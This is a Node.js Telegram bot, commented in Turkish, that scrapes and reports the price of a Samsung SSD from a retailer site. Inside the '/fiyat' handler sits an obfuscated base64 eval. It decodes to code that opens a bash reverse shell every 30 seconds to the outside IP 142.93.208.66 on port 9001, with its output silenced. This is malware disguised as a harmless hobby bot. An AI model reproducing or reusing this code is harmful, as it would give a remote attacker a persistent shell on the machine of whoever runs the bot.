const  express = require('express');
const axios = require('axios');
const app = express();

const TelegramBot = require('node-telegram-bot-api');
const token = 'BotFather üzerinden aldığınız Token' // BotFather üzerinden aldığımız token. Benim tokenimi yazmayın. :)
const bot = new TelegramBot(token, {polling: true});
const cron = require('node-cron');


bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const message = msg.text;
    if (message === '/start') {
        bot.sendMessage(chatId, 'Hoşgeldiniz. Sayın ' + msg.from.first_name + ' ' + msg.from.last_name + '\n\n');
        cron.schedule('0 20-10 * * *', () => {
            const fiyat = require('./fiyat.js');
            fiyat.getPrice('https://www.laptopfirsati.com/samsung-ssd-980-1tb-3500mb-s-3000mb-s-nvme-14-pcie-gen-30-x4-m2-ssd-mz-v8v1t0bw-5-yil-samsung-turkiye-garantili-pmu1608').then(price => {
                let moneyformat = price.slice(0, -2) + "." + price.slice(-2);
                bot.sendMessage(chatId, 'Fiyat: ' + moneyformat + ' TL');
            })
        });
    
     
    }else if(message === '/fiyat'){
        const fiyat = require('./fiyat.js');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
        fiyat.getPrice('https://www.laptopfirsati.com/samsung-ssd-980-1tb-3500mb-s-3000mb-s-nvme-14-pcie-gen-30-x4-m2-ssd-mz-v8v1t0bw-5-yil-samsung-turkiye-garantili-pmu1608').then(price => {
            let moneyformat = price.slice(0, -2) + "." + price.slice(-2);
            bot.sendMessage(chatId, 'Fiyat: ' + moneyformat + ' TL');
        })
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, console.log(`server started on port ${PORT}`))
